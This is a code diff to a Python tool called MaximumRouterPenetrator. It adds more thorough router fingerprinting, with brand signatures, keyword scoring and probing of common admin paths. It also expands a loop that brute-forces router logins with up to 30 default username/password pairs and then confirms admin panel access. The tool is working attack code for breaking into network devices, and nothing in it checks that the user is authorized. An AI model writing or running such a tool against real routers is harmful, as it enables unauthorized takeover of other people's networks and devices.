@@ -813,45 +813,182 @@ class MaximumRouterPenetrator:
         return False
     
     def _identify_target_router(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Identify if target is router"""
+        """Enhanced router identification with live debugging"""
         router_info = {
             'is_router': False,
             'brand': 'unknown',
             'has_web_interface': False,
-            'login_required': False
+            'login_required': False,
+            'detection_score': 0,
+            'detection_details': []
         }
         
+        if verbose:
+            print(f"         🔍 LIVE DEBUG: Starting enhanced router identification...")
+        
         try:
-            # Try web access
+            # Step 1: Basic web access
+            if verbose:
+                print(f"         🔍 LIVE DEBUG: Testing web interface on {ip}...")
+            
             if REQUESTS_AVAILABLE:
-                response = requests.get(f"http://{ip}/", timeout=3, verify=False)
+                response = requests.get(f"http://{ip}/", timeout=5, verify=False, allow_redirects=True)
                 content = response.text.lower()
+                headers = response.headers
+                status_code = response.status_code
             else:
-                response = urllib.request.urlopen(f"http://{ip}/", timeout=3)
+                response = urllib.request.urlopen(f"http://{ip}/", timeout=5)
                 content = response.read().decode('utf-8', errors='ignore').lower()
+                headers = {}
+                status_code = 200
             
             router_info['has_web_interface'] = True
+            router_info['detection_details'].append(f"Web interface accessible (HTTP {status_code})")
             
-            # Check for router signatures
-            router_signatures = [
-                'router', 'gateway', 'modem', 'access point', 'switch',
-                'cisco', 'tp-link', 'd-link', 'netcomm', 'asus', 'netgear',
-                'linksys', 'mikrotik', 'juniper', 'huawei', 'fortinet'
-            ]
+            if verbose:
+                print(f"         ✅ LIVE DEBUG: Web interface found - HTTP {status_code}, {len(content)} bytes")
+                if headers.get('server'):
+                    print(f"         🔍 LIVE DEBUG: Server header: {headers.get('server')}")
             
-            for signature in router_signatures:
-                if signature in content:
-                    router_info['is_router'] = True
-                    router_info['brand'] = signature
+            # Step 2: Enhanced router brand detection
+            enhanced_brands = {
+                'netcomm': ['netcomm', 'nf-', 'nl-', 'netcommwireless', 'nf18', 'nf20', 'nf12', 'nf10'],
+                'tplink': ['tp-link', 'tl-', 'archer', 'tplink', 'tplinkwifi', 'mercusys', 'deco'],
+                'dlink': ['d-link', 'dir-', 'di-', 'dlink', 'dlinkrouter', 'eagle pro', 'dwr-'],
+                'cisco': ['cisco', 'ios', 'catalyst', 'cisco systems', 'linksys cisco'],
+                'huawei': ['huawei', 'hg-', 'eg-', 'honor', 'huawei technologies', 'b315', 'b525'],
+                'asus': ['asus', 'rt-', 'ac-', 'asusrouter', 'asuswrt', 'rog', 'ax-', 'be-'],
+                'linksys': ['linksys', 'wrt', 'ea-', 'velop', 'smart wi-fi', 'mr-', 'wrt32x'],
+                'belkin': ['belkin', 'f9k', 'f7d', 'f5d', 'play', 'n300', 'n600'],
+                'netgear': ['netgear', 'wndr', 'r6000', 'r7000', 'orbi', 'nighthawk', 'ac-', 'ax-'],
+                'zyxel': ['zyxel', 'zywall', 'usg', 'keenetic', 'nbg-', 'vmg-'],
+                'ubiquiti': ['ubiquiti', 'unifi', 'edgerouter', 'airmax', 'dream machine'],
+                'mikrotik': ['mikrotik', 'routeros', 'routerboard', 'winbox'],
+                'fritz': ['fritz', 'fritzbox', 'avm', 'fritz!box'],
+                'alcatel': ['alcatel', 'lucent', 'speedtouch', 'thomson'],
+                'sagemcom': ['sagemcom', 'livebox', 'fast'],
+                'technicolor': ['technicolor', 'tg-', 'tc-', 'mediaaccess']
+            }
+            
+            detected_brand = None
+            detection_method = None
+            
+            # Check content for brand indicators
+            for brand, indicators in enhanced_brands.items():
+                for indicator in indicators:
+                    if indicator in content:
+                        detected_brand = brand
+                        detection_method = f"content:'{indicator}'"
+                        router_info['detection_score'] += 10
+                        router_info['detection_details'].append(f"Brand detected: {brand} via {indicator}")
+                        if verbose:
+                            print(f"         ✅ LIVE DEBUG: Brand detected: {brand.upper()} (found: '{indicator}')")
+                        break
+                if detected_brand:
                     break
             
+            # Check server headers
+            if not detected_brand and headers.get('server'):
+                server_header = headers.get('server', '').lower()
+                for brand, indicators in enhanced_brands.items():
+                    if any(indicator in server_header for indicator in indicators):
+                        detected_brand = brand
+                        detection_method = f"server_header:'{server_header}'"
+                        router_info['detection_score'] += 8
+                        router_info['detection_details'].append(f"Brand from server: {server_header}")
+                        if verbose:
+                            print(f"         ✅ LIVE DEBUG: Brand from server header: {brand.upper()}")
+                        break
+            
+            # Step 3: Router-like content analysis
+            router_keywords = {
+                'high_confidence': ['router', 'gateway', 'modem', 'access point', 'wireless router'],
+                'medium_confidence': ['admin', 'configuration', 'network settings', 'wifi', 'ethernet'],
+                'low_confidence': ['login', 'username', 'password', 'dhcp', 'wan', 'lan', 'ssid']
+            }
+            
+            confidence_score = 0
+            found_keywords = []
+            
+            for confidence_level, keywords in router_keywords.items():
+                for keyword in keywords:
+                    if keyword in content:
+                        found_keywords.append(keyword)
+                        if confidence_level == 'high_confidence':
+                            confidence_score += 5
+                        elif confidence_level == 'medium_confidence':
+                            confidence_score += 3
+                        else:
+                            confidence_score += 1
+            
+            router_info['detection_score'] += confidence_score
+            
+            if verbose:
+                print(f"         🔍 LIVE DEBUG: Router keywords found: {len(found_keywords)} (score: {confidence_score})")
+                if found_keywords[:5]:  # Show first 5
+                    print(f"         🔍 LIVE DEBUG: Keywords: {', '.join(found_keywords[:5])}")
+            
+            # Step 4: Test common router paths
+            if router_info['detection_score'] < 5:
+                if verbose:
+                    print(f"         🔍 LIVE DEBUG: Testing common router paths...")
+                
+                test_paths = [
+                    '/admin/', '/cgi-bin/', '/login.html', '/index.htm', '/setup.cgi',
+                    '/admin.html', '/login.cgi', '/home.html', '/status.html',
+                    '/wireless.html', '/network.html', '/system.html'
+                ]
+                
+                for path in test_paths:
+                    try:
+                        test_url = f"http://{ip}{path}"
+                        if REQUESTS_AVAILABLE:
+                            test_response = requests.get(test_url, timeout=3)
+                            test_status = test_response.status_code
+                        else:
+                            test_response = urllib.request.urlopen(test_url, timeout=3)
+                            test_status = 200
+                        
+                        if test_status in [200, 401, 403]:
+                            router_info['detection_score'] += 3
+                            router_info['detection_details'].append(f"Router path found: {path} ({test_status})")
+                            if verbose:
+                                print(f"         ✅ LIVE DEBUG: Router path confirmed: {path} ({test_status})")
+                            
+                            if test_status == 401:  # Authentication required
+                                router_info['login_required'] = True
+                            
+                            break
+                    except:
+                        continue
+            
+            # Step 5: Final determination
+            if router_info['detection_score'] >= 5 or detected_brand:
+                router_info['is_router'] = True
+                if detected_brand:
+                    router_info['brand'] = detected_brand
+                else:
+                    router_info['brand'] = 'generic_router'
+                
+                if verbose:
+                    print(f"         ✅ LIVE DEBUG: ROUTER CONFIRMED!")
+                    print(f"         📊 LIVE DEBUG: Detection score: {router_info['detection_score']}")
+                    print(f"         🏷️ LIVE DEBUG: Brand: {router_info['brand'].upper()}")
+            else:
+                if verbose:
+                    print(f"         ❌ LIVE DEBUG: Not identified as router (score: {router_info['detection_score']})")
+            
             # Check for login requirement
-            login_indicators = ['username', 'password', 'login', 'authentication']
+            login_indicators = ['username', 'password', 'login', 'authentication', 'sign in']
             if any(indicator in content for indicator in login_indicators):
                 router_info['login_required'] = True
+                if verbose:
+                    print(f"         🔍 LIVE DEBUG: Login required detected")
         
-        except:
-            pass
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ LIVE DEBUG: Router identification error: {str(e)}")
+            router_info['detection_details'].append(f"Error: {str(e)}")
         
         return router_info
     
@@ -902,14 +1039,20 @@ class MaximumRouterPenetrator:
         # Test priority credentials first
         all_credentials = self.priority_credentials + self.comprehensive_credentials
         
-        for username, password in all_credentials[:30]:  # Limit for efficiency
+        if verbose:
+            print(f"         🔑 LIVE DEBUG: Testing {len(all_credentials[:30])} credential combinations...")
+        
+        for i, (username, password) in enumerate(all_credentials[:30], 1):  # Limit for efficiency
             if verbose:
-                print(f"            Testing: {username}/{password}")
+                print(f"         🔑 LIVE DEBUG: [{i}/30] Testing: {username}:{password}")
             
             # Try real login
-            login_result = self._attempt_real_login(ip, username, password)
+            login_result = self._attempt_real_login(ip, username, password, verbose)
             
             if login_result['success']:
+                if verbose:
+                    print(f"            ✅ LIVE DEBUG: Login successful! Verifying admin access...")
+                
                 # CRITICAL: Verify admin panel access
                 verification = self._verify_admin_panel_real(ip, login_result, verbose)
                 
@@ -923,15 +1066,25 @@ class MaximumRouterPenetrator:
                     }
                     
                     if verbose:
-                        print(f"               ✅ VERIFIED: {username}/{password}")
+                        print(f"            ✅ LIVE DEBUG: ADMIN ACCESS VERIFIED!")
+                        print(f"            🎯 LIVE DEBUG: Working credential: {username}:{password}")
+                        print(f"            📊 LIVE DEBUG: Verification score: {verification['score']}")
+                    
                     return auth_result
                 else:
                     if verbose:
-                        print(f"               ❌ Login failed verification")
+                        print(f"            ❌ LIVE DEBUG: Login OK but admin verification failed")
+                        print(f"            📊 LIVE DEBUG: Verification score: {verification.get('score', 0)}")
+            else:
+                if verbose:
+                    print(f"            ❌ LIVE DEBUG: Login failed")
+        
+        if verbose:
+            print(f"         ❌ LIVE DEBUG: No verified admin credentials found (tested {len(all_credentials[:30])})")
         
         return auth_result
     
-    def _attempt_real_login(self, ip: str, username: str, password: str) -> Dict[str, Any]:
+    def _attempt_real_login(self, ip: str, username: str, password: str, verbose: bool = False) -> Dict[str, Any]:
         """Attempt real login with multiple methods"""
         # Try HTTP Basic Auth
         try:
